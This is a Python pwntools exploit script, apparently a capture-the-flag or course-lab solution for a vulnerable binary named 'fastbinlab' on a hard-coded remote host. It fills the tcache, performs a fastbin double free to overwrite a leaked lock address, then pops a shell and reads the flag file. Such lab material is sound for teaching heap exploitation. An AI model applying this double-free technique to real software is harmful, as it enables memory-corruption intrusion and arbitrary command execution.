#!/usr/bin/python3

from pwn import *
import sys

BIN = './fastbinlab'

if len(sys.argv) > 1:
    r = remote( '140.112.31.97', 30105 )
else:
    r = process( BIN )

def add(size, data):
    r.sendafter("Choice >", '1')
    r.sendafter("size : ", str(size))
    r.sendafter("Content : ", data)

def delete(idx):
    r.sendafter("Choice >", '2')
    r.sendafter("index : ", str(idx))

r.recvuntil('Lock address : ')
target = int(r.recvline()[2:-1], 16)
log.info(f'target: {hex(target)}')

chunk_size_20 = target - 0x18 + 7
for i in range(7):
    add(0x18, 'QQ')
for i in range(7):
    delete(i)

add(0x18, 'QQ') #7
add(0x18, 'QQ') #8
add(0x18, 'QQ') #9
delete(7)
delete(8)
delete(7)

add(0x18, p64(chunk_size_20)) #A
add(0x18, 'QQ') #B
add(0x18, 'QQ') #C
add(0x18, b'A' + p64(0xCAFEDEADBEEFCAFE))

r.sendline('3')
sleep(0.3)
r.sendline('cat /home/`whoami`/flag')
r.interactive()
